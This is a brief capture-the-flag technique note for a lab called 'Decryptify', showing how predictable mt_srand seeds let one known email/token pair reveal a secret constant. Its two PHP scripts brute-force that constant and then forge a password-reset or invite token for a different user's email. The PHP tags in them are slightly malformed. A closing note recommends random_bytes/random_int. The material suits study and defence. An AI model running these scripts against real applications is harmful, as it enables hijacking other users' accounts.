# PHP mt_rand Token Prediction

Used on: **Decryptify**

If token generation uses `mt_srand()` with a predictable seed, one known token can reveal the constant or seed logic needed to generate valid tokens for other users.

## When to Use

- The application uses random tokens for sensitive actions like password resets or invites.
- Source code or documentation reveals the use of `mt_srand()` and `mt_rand()`.
- The application uses a predictable token generation scheme with a small seed space.

## Prerequisites

- Known email/token pair.
- Source or documentation describing seed generation.
- Small enough constant/seed search space.

## Recover Constant

```php
<php
function calculate_seed_value($email, $constant_value) {
    $email_length = strlen($email);
    $email_hex = hexdec(substr($email, 0, 8));
    return hexdec($email_length + $constant_value + $email_hex);
}

$email = "alpha@fake.thm";
$random_value = intval(base64_decode("MTM0ODMzNzEyMg=="));

for ($c = 0; $c <= 1000000; $c++) {
    mt_srand(calculate_seed_value($email, $c));
    if (mt_rand() === $random_value) {
        echo "Constant value: $c\n";
        break;
    }
}
>
```

## Generate Token

```php
<php
function calculate_seed_value($email, $constant_value) {
    $email_length = strlen($email);
    $email_hex = hexdec(substr($email, 0, 8));
    return hexdec($email_length + $constant_value + $email_hex);
}

$email = "hello@fake.thm";
mt_srand(calculate_seed_value($email, 99999));
echo base64_encode(mt_rand()) . "\n";
>
```

## Defensive Note

Use `random_bytes()` / `random_int()` for security-sensitive tokens and avoid deterministic seeds for authentication or invite codes.

## Related

- [../web-disclosure/public-log-invite-code-disclosure.md](../web-disclosure/public-log-invite-code-disclosure.md)


